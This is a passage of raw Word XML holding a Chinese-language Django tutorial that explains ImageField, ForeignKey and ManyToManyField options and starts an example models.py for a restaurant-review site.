              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>max_length = xxxx</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4FC22502" w14:textId="1830E603" w:rsidR="003802BB" w:rsidRDefault="003802BB" w:rsidP="00995934">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="151"/>
              </w:numPr>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
              <w:ind w:left="0"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="003802BB" w14:paraId="6E23C055"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13428AA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>ImageField(</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="jsdarkmode6"/>
                <w:color w:val="FFA900"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>upload_to</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>=None, height_field=None, width_field=None, max_length=100,)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="70A3FA7C" w14:textId="14DF9A6E" w:rsidR="003802BB" w:rsidRDefault="003802BB">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="5DCD62E7" w14:textId="77777777" w:rsidR="003802BB" w:rsidRDefault="003802BB" w:rsidP="00995934">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="152"/>
              </w:numPr>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="jsdarkmode7"/>
                <w:color w:val="FFA900"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>upload_to = "/some folder/"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2B581B80" w14:textId="77777777" w:rsidR="003802BB" w:rsidRDefault="003802BB" w:rsidP="00995934">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="152"/>
              </w:numPr>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>其他选项是可选的.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="003802BB" w14:paraId="24055949" w14:textId="77777777" w:rsidTr="003802BB">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="76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C967DFA" w14:textId="77777777" w:rsidR="003802BB" w:rsidRDefault="003802BB">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>ForeignKey(</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="jsdarkmode8"/>
                <w:color w:val="FFA900"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>to</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="jsdarkmode9"/>
                <w:color w:val="FFA900"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>on_delete</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>, **options) - 单对多关系</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="646BDED2" w14:textId="77777777" w:rsidR="003802BB" w:rsidRDefault="003802BB">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="19501A00" w14:textId="77777777" w:rsidR="003802BB" w:rsidRDefault="003802BB" w:rsidP="00995934">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="153"/>
              </w:numPr>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="jsdarkmode10"/>
                <w:color w:val="FFA900"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>to</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>必需指向其他模型，比如 Book or 'self' .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="31022135" w14:textId="77777777" w:rsidR="003802BB" w:rsidRDefault="003802BB" w:rsidP="00995934">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="153"/>
              </w:numPr>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>必需指定</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="jsdarkmode11"/>
                <w:color w:val="FFA900"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>on_delete </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>options（删除选项): i.e, "on_delete = models.CASCADE" or "on_delete = models.SET_NULL" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="39C0B25D" w14:textId="77777777" w:rsidR="003802BB" w:rsidRDefault="003802BB" w:rsidP="00995934">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="153"/>
              </w:numPr>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="jsdarkmode12"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>可以设置"default = xxx" or "null = True" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="308777E5" w14:textId="77777777" w:rsidR="003802BB" w:rsidRDefault="003802BB" w:rsidP="00995934">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="153"/>
              </w:numPr>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="jsdarkmode13"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>如果有必要，可以设置 "limit_choices_to = "，如下面例子。</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="580F6B6D" w14:textId="77777777" w:rsidR="003802BB" w:rsidRDefault="003802BB" w:rsidP="00995934">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="153"/>
              </w:numPr>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>staff_member = models.ForeignKey( User, on_delete=models.CASCADE, limit_choices_to={'is_staff': True}, )</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="62990944" w14:textId="77777777" w:rsidR="003802BB" w:rsidRDefault="003802BB" w:rsidP="00995934">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="153"/>
              </w:numPr>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>可以设置 "related_name = xxx" 便于反向查询。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="003802BB" w14:paraId="1C0B60D9" w14:textId="77777777" w:rsidTr="003802BB">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>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C3F085A" w14:textId="77777777" w:rsidR="003802BB" w:rsidRDefault="003802BB">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>ManyToManyField(to, **options) - 多对多关系</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="193065CD" w14:textId="77777777" w:rsidR="003802BB" w:rsidRDefault="003802BB" w:rsidP="00995934">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="154"/>
              </w:numPr>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="jsdarkmode14"/>
                <w:color w:val="FFA900"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>to </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>必需指向其他模型，比如 User or 'self' .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="70BE1BBF" w14:textId="77777777" w:rsidR="003802BB" w:rsidRDefault="003802BB" w:rsidP="00995934">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="154"/>
              </w:numPr>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>设置 "symmetrical = False " if 多对多关系不是对称的</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="483B6A05" w14:textId="77777777" w:rsidR="003802BB" w:rsidRDefault="003802BB" w:rsidP="00995934">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="154"/>
              </w:numPr>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>设置 "through = 'intermediary model' " 如果需要建立中间模型来搜集更多信息</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A5F1091" w14:textId="77777777" w:rsidR="003802BB" w:rsidRDefault="003802BB" w:rsidP="00995934">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="154"/>
              </w:numPr>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>可以设置 "related_name = xxx" 便于反向查询。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="301DF83E" w14:textId="3057FFD4" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>一个复杂点的Django Model模型</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08C94163" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们现在来看一个更复杂点的Django模型。假设我们要开发一个餐厅(restaurant)的在线点评网站，允许用户(user)上传菜肴(dish)的图片并点评餐厅，我们就可以设计如下模型。用户与餐厅，餐厅与菜肴，及用户与菜肴都是单对多的关系。我们可以这样理解：一个用户可以访问点评多个餐厅，一个餐厅有多个菜肴，一个用户可以上传多个菜肴的图片。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="588D684C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># models.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="121C0F31" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0CE826C7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.db import models</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28894B6E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.contrib.auth.models import User</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="744BD1C3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from datetime import date</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D4C5B4C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="15DC92BF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class Restaurant(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E7D179F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    name = models.TextField()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4574BCE5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    address = models.TextField(blank=True, default='')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="761A8A2E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    telephone = models.TextField(blank=True, default='')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CCF1E35" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    url = models.URLField(blank=True, null=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DBEE2D7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    user = models.ForeignKey(User, default=1,on_delete=models.CASCADE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77082D03" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    date = models.DateField(default=date.today)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DBA218C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="40F0FDBB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    def __str__(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35764198" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        return self.nameclass Dish(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05C86DA1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    name = models.TextField()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42E3A69D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">    description = models.TextField(blank=True,  default='')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BB1B2E9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    price = models.DecimalField('USD amount', max_digits=8, decimal_places=2, blank=True, null=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0237FD6D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    user = models.ForeignKey(User, default=1, on_delete=models.CASCADE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AA51519" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    date = models.DateField(default=date.today)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58400575" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    image = models.ImageField(upload_to="myrestaurants", blank=True, null=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40C42738" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># Related name "dishes" allows you to use restaurant.dishes.all to access all dishes objects</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BB06E8C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
